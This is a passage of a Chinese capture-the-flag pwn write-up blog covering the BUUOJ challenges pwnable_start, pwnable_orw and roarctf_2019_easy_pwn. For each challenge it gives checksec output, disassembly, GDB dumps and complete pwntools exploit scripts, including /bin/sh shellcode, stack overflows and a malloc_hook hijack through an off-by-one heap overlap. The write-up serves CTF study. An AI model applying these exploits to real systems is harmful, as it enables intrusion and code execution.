leak-libc.sym[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">	sys_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">	success(<span class="string">&#x27;leak addr: &#x27;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line">	success(<span class="string">&#x27;libc base: &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">	success(<span class="string">&#x27;system addr &#x27;</span>+<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"></span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	<span class="comment">#add(8,p32(sys_addr)+&#x27;;sh;&#x27;)</span></span><br><span class="line">	add(<span class="number">8</span>,p32(sys_addr)+<span class="string">&#x27;||sh&#x27;</span>)</span><br><span class="line">	show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pwn(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28478</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h2 id="pwnable_start"><a class="markdownIt-Anchor" href="#pwnable_start"></a> pwnable_start</h2>
<h3 id="1checksec-61"><a class="markdownIt-Anchor" href="#1checksec-61"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-60"><a class="markdownIt-Anchor" href="#2ida-60"></a> 2.IDA</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">; =============== S U B R O U T I N E =======================================</span><br><span class="line"></span><br><span class="line">                 public _start</span><br><span class="line"> _start          proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">                 push    esp</span><br><span class="line">                 push    offset _exit</span><br><span class="line">                 xor     eax, eax</span><br><span class="line">                 xor     ebx, ebx</span><br><span class="line">                 xor     ecx, ecx</span><br><span class="line">                 xor     edx, edx</span><br><span class="line">                 push    &#x27;:FTC&#x27;</span><br><span class="line">                 push    &#x27; eht&#x27;</span><br><span class="line">                 push    &#x27; tra&#x27;</span><br><span class="line">                 push    &#x27;ts s&#x27;</span><br><span class="line">                 push    2774654Ch</span><br><span class="line">                 mov     ecx, esp        ; addr</span><br><span class="line">                 mov     dl, 20          ; len</span><br><span class="line">                 mov     bl, 1           ; fd</span><br><span class="line">                 mov     al, 4           ; syscall(write)</span><br><span class="line">                 int     80h             ; LINUX - sys_write</span><br><span class="line">                 xor     ebx, ebx        ; ebx清零</span><br><span class="line">                 mov     dl, 60          ; len</span><br><span class="line">                 mov     al, 3           ; syscall(read)</span><br><span class="line">                 int     80h             ; LINUX -</span><br><span class="line">                 add     esp, 14h</span><br><span class="line">                 retn</span><br><span class="line">.text:0804809C _start          endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>
<blockquote>
<p>1.向<code>addr</code>空间写入&quot;Let’s start the CTF:&quot;;</p>
<p>2.调用<code>read</code>函数，这里有个栈溢出，溢出后返回<code>addr</code>；</p>
<p>3.返回后向<code>addr</code>写入<code>shellcode</code>；</p>
<p>4.最后<code>溢出</code>+<code>抬栈</code>+<code>shellcode</code>。</p>
</blockquote>
<h3 id="3exp-47"><a class="markdownIt-Anchor" href="#3exp-47"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&#x27;./start&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27809</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">leak=u32(p.recv(<span class="number">4</span>));</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line">shellcode= <span class="string">&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">payload= <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + p32(leak+<span class="number">20</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="pwnable_orw"><a class="markdownIt-Anchor" href="#pwnable_orw"></a> pwnable_orw</h2>
<h3 id="1checksec-62"><a class="markdownIt-Anchor" href="#1checksec-62"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<h3 id="2ida-61"><a class="markdownIt-Anchor" href="#2ida-61"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give my your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>直接传入<code>shellcode</code>过后，执行<code>shellcode</code></p>
</blockquote>
<h3 id="3exp-48"><a class="markdownIt-Anchor" href="#3exp-48"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26098</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give my your shellcode:&quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="roarctf_2019_easy_pwn"><a class="markdownIt-Anchor" href="#roarctf_2019_easy_pwn"></a> roarctf_2019_easy_pwn</h2>
<h3 id="1checksec-63"><a class="markdownIt-Anchor" href="#1checksec-63"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h3 id="2ida-62"><a class="markdownIt-Anchor" href="#2ida-62"></a> 2.IDA</h3>
<p>四个功能：增删查改</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,data</span>):   </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&#x27;2&#x27;</span>) </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):   </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):   </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&#x27;4&#x27;</span>) </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure>
<p><strong>edit</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">15</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v2 = *((_DWORD *)&amp;unk_202040 + <span class="number">4</span> * v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    v2 = read_input(<span class="number">1</span>);</span><br><span class="line">    v4 = vuln(*((_DWORD *)&amp;unk_202044 + <span class="number">4</span> * v3), v2);<span class="comment">// off by one</span></span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v2);</span><br><span class="line">      v2 = sub_D92(qword_202048[<span class="number">2</span> * v3], v4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>off by one</code>漏洞,导致我们个已覆盖下一个堆块的<code>size</code>域，从而实现<code>chunk overlapping</code></p>
</blockquote>
<h3 id="3gdb-10"><a class="markdownIt-Anchor" href="#3gdb-10"></a> 3.GDB</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#code</span><br><span class="line">	add(0x18)#0</span><br><span class="line">	add(0x18)#1</span><br><span class="line">	add(0x88)#2</span><br><span class="line">	add(0x88)#3</span><br><span class="line"></span><br><span class="line">	add(0x28)#4</span><br><span class="line">	add(0x28)#5</span><br><span class="line">	add(0x68)#6</span><br><span class="line"></span><br><span class="line">	edit(0,0x18+10,&#x27;a&#x27;*0x18+&#x27;\xb1&#x27;)#off by one</span><br><span class="line">	#1.szie=0x18 2.size=0x98</span><br><span class="line">	#1.size+2.size=chunk_add.size=0xb0</span><br><span class="line">	#	0x10+8 like this is more conviente to use</span><br><span class="line">	#	not to add sth like p64(0)</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"></span><br><span class="line">#GDB</span><br><span class="line">pwndbg&gt; x/32gx 0x55a813ab9000</span><br><span class="line">0x55a813ab9000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55a813ab9010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a813ab9020:	0x6161616161616161	0x00000000000000b1</span><br><span class="line">									这里已经被修改为&#x27;\xb1&#x27;</span><br><span class="line">0x55a813ab9030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a813ab9040:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55a813ab9050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a813ab9060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">&gt;这样我们free(1)，就会得到`libc base`了</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#code</span><br><span class="line">	free(1)</span><br><span class="line">	add(0xa8)#1</span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	edit(1,0x20,&#x27;a&#x27;*0x18+p64(0x91))#repair</span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	free(2)</span><br><span class="line">	show(1)    #leak</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">#GDB</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">.........</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55d9d3909040 —▸ 0x7ff8d0bbab78 (main_arena+88) ◂— 0x55d9d3909040</span><br><span class="line">..........</span><br><span class="line">pwndbg&gt; x/32gx 0x55d9d3909000</span><br><span class="line">0x55d9d3909000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55d9d3909010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d9d3909020:	0x6161616161616161	0x00000000000000b1</span><br><span class="line">0x55d9d3909030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d9d3909040:	0x6161616161616161	0x0000000000000091</span><br><span class="line">0x55d9d3909050:	0x00007ff8d0bbab78	0x00007ff8d0bbab78</span><br><span class="line">0x55d9d3909060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55d9d3909070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">&gt;再输出chunk1的内容就可以输出`0x00007ff8d0bbab78`,从而泄露`libc base`</span><br><span class="line">最后输出</span><br><span class="line">[+] libc base=&gt;0x7ff8d07f6000</span><br><span class="line">[+] malloc hook=&gt;0x7ff8d0bbab10</span><br><span class="line">[+] realloc hook=&gt;0x7ff8d087a6c0</span><br><span class="line">[+] one gadget=&gt;0x7ff8d083b26a</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">这里我们用的one_gadget是</span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line">所以需要满足条件[rsp+0x30] == NULL,这就需要realloc来对栈上的东西进行微调</span><br><span class="line">#code</span><br><span class="line">	edit(4,0x32,&#x27;a&#x27;*0x28+&#x27;\xa1&#x27;) #off by one</span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	free(5)</span><br><span class="line">	free(6)</span><br><span class="line">	add(0x98)#2</span><br><span class="line">	edit(2,0x38,&#x27;a&#x27;*0x28+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">	#new 2 take the 5&#x27;s place and hijack 6 to malloc hook</span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	add(0x68)#5</span><br><span class="line">	add(0x68)#6 in malloc hook</span><br><span class="line">	edit(6,27,&#x27;a&#x27;*(0x13-8)+p64(one_gadget)+p64(realloc))</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"></span><br><span class="line">&gt;修改realloc_hook为onegadget，修改malloc_hook为realloc+偏移地址</span><br><span class="line">#GDB</span><br><span class="line">&gt;断点过后走几个单步</span><br><span class="line">pwndbg&gt; x/16gx $rsp+0x30</span><br><span class="line">0x7ffeb950d680:	0x0000000000000000	0x00007f5695fa773b</span><br><span class="line">0x7ffeb950d690:	0x00007ffeb950d8db	0x00007f56961d99a0</span><br><span class="line">0x7ffeb950d6a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffeb950d6b0:	0x0000000000000000	0x00007f5695fa773b</span><br><span class="line">0x7ffeb950d6c0:	0x0000000000000000	0x00007ffeb950dd58</span><br><span class="line">0x7ffeb950d6d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffeb950d6e0:	0x0000000000000000	0x00007ffeb950d8f0</span><br><span class="line">0x7ffeb950d6f0:	0x0000000000000064	0x0000004000000000</span><br><span class="line">&gt; 调用了过后就达成了</span><br></pre></td></tr></table></figure>
<h3 id="4exp-13"><a class="markdownIt-Anchor" href="#4exp-13"></a> 4.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./roarctf_2019_easy_pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/joe1sn/libc/64/libc-2.23.so&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./roarctf_2019_easy_pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,data</span>):   </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&#x27;2&#x27;</span>) </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):   </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):   </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&#x27;4&#x27;</span>) </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">	add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">	add(<span class="number">0x88</span>)<span class="comment">#2</span></span><br><span class="line">	add(<span class="number">0x88</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">	add(<span class="number">0x28</span>)<span class="comment">#4</span></span><br><span class="line">	add(<span class="number">0x28</span>)<span class="comment">#5</span></span><br><span class="line">	add(<span class="number">0x68</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">	edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\xb1&#x27;</span>)<span class="comment">#off by one</span></span><br><span class="line">	<span class="comment">#1.szie=0x18 2.size=0x98</span></span><br><span class="line">	<span class="comment">#1.size+2.size=chunk_add.size=0xb0</span></span><br><span class="line">	<span class="comment">#	0x10+8 like this is more conviente to use</span></span><br><span class="line">	<span class="comment">#	not to add sth like p64(0)</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">0xa8</span>)<span class="comment">#1</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	edit(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>))<span class="comment">#repair</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	free(<span class="number">2</span>)</span><br><span class="line">	show(<span class="number">1</span>)    <span class="comment">#leak</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">	libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f\x00\x00&quot;</span>)[-<span class="number">8</span>:])-<span class="number">0x3c4b78</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">	malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">	realloc = libc_base + libc.symbols[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">	one_gadget=libc_base+<span class="number">0x4526a</span></span><br><span class="line">	log.success(<span class="string">&quot;libc base=&gt;0x%x&quot;</span>,libc_base)</span><br><span class="line">	log.success(<span class="string">&quot;malloc hook=&gt;0x%x&quot;</span>,malloc_hook)</span><br><span class="line">	log.success(<span class="string">&quot;realloc hook=&gt;0x%x&quot;</span>,realloc)</span><br><span class="line">	log.success(<span class="string">&quot;one gadget=&gt;0x%x&quot;</span>,one_gadget)</span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	add(0x28)#4</span></span><br><span class="line"><span class="string">	add(0x28)#5</span></span><br><span class="line"><span class="string">	add(0x68)#6</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">	edit(<span class="number">4</span>,<span class="number">0x32</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+<span class="string">&#x27;\xa1&#x27;</span>) <span class="comment">#off by one</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	free(<span class="number">5</span>)</span><br><span class="line">	free(<span class="number">6</span>)</span><br><span class="line">	add(<span class="number">0x98</span>)<span class="comment">#2</span></span><br><span class="line">	edit(<span class="number">2</span>,<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">	<span class="comment">#new 2 take the 5&#x27;s place and hijack 6 to malloc hook</span></span><br><span class="line">	<span 